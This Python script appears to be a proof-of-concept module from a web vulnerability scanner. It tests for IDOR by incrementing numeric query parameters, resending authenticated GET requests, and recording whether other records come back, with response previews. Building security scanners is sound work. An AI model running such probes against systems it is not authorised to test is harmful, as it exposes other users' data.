import json
import sys

from backend.pocs.endpoints._common import (
    IGNORE_KEYS,
    emit,
    error_result,
    is_number,
    make_result,
    parse_payload,
    request_once,
)


POC_NAME = "idor_query_read_resource"


def main():
    payload = parse_payload()

    base_url = payload["base_url"].rstrip("/")
    path = payload.get("path", "")
    method = payload.get("method", "GET").upper()
    query_params = payload.get("query_params", {})
    auth = payload.get("auth", {}) or {}
    auth_headers = auth.get("headers", {}) or {}
    auth_cookies = auth.get("cookies", {}) or {}

    url = f"{base_url}{path}"

    print(f"[DEBUG] url={url}", file=sys.stderr)
    print(f"[DEBUG] method={method}", file=sys.stderr)
    print(f"[DEBUG] original_query_params={query_params}", file=sys.stderr)

    results = []
    found = False

    try:
        if method != "GET":
            emit(make_result(
                poc_name=POC_NAME,
                status="Skipped",
                description="GET 요청이 아니어서 IDOR GET 테스트를 수행하지 않았습니다.",
                evidence=f"method={method}",
            ))
            return

        if not query_params:
            emit(make_result(
                poc_name=POC_NAME,
                status="Skipped",
                description="query_params가 없어 IDOR GET 테스트를 수행할 수 없습니다.",
                evidence="missing query_params",
            ))
            return

        for target_key in query_params.keys():
            if target_key.lower() in IGNORE_KEYS:
                continue

            original_value = query_params[target_key]

            if not is_number(original_value):
                continue

            changed_value = str(int(original_value) + 1)

            test_params = query_params.copy()
            test_params[target_key] = changed_value

            print(f"[DEBUG] target_key={target_key}", file=sys.stderr)
            print(f"[DEBUG] original_value={original_value}", file=sys.stderr)
            print(f"[DEBUG] changed_value={changed_value}", file=sys.stderr)
            print(f"[DEBUG] test_params={test_params}", file=sys.stderr)

            response = request_once(
                method=method,
                url=url,
                query_params=test_params,
                auth_headers=auth_headers,
                auth_cookies=auth_cookies,
                timeout=5,
            )

            success = response.status_code == 200

            if success:
                found = True

            results.append({
                "target_key": target_key,
                "original_value": original_value,
                "changed_value": changed_value,
                "status_code": response.status_code,
                "success": success,
                "response_preview": response.text[:200],
            })

        if not results:
            result = make_result(
                poc_name=POC_NAME,
                status="Skipped",
                description="테스트할 숫자 query value를 찾지 못했습니다.",
                evidence="no numeric query value",
            )
        elif found:
            result = make_result(
                poc_name=POC_NAME,
                status="Completed",
                description="숫자 query 값을 변경한 GET 요청이 성공했습니다. 다른 사용자 리소스 조회 가능성이 있습니다.",
                evidence="changed numeric query value returned 200",
                raw_output=json.dumps(results, ensure_ascii=False),
                vulnerable=True,
            )
        else:
            result = make_result(
                poc_name=POC_NAME,
                status="Completed",
                description="숫자 query 값을 변경한 GET 요청이 성공하지 않았습니다.",
                evidence="changed numeric query value did not return 200",
                raw_output=json.dumps(results, ensure_ascii=False),
                vulnerable=False,
            )

    except Exception as e:
        result = error_result(POC_NAME, e)

    emit(result)


if __name__ == "__main__":
    main()
